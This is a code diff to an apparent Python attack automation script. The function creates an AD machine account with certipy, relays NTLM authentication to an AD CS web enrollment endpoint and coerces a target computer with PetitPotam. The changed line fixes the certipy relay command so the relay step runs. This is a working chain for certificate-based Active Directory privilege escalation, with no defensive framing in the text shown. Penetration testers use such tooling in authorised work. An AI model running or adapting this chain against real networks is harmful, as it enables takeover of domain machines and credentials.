@@ -83,7 +83,7 @@ def automate_steps(domain, username, password, machine_acc, machine_acc_pw, dc_i
     run_command(f"certipy account create -u {username}@{domain} -p {password} -dc-ip {dc_ip} -user {machine_acc}$ -pass {machine_acc_pw}")
     
     # Step 3: Configure NTLM Relay With Certipy
-    run_command(f"certipy -target http://{ad_cs_web_enroll} -template Machine")
+    run_command(f"certipy relay -target http://{ad_cs_web_enroll} -template Machine")
     
     # Step 4: Coerce Target Computer With PetitPotam
     home_dir = os.path.expanduser("~")
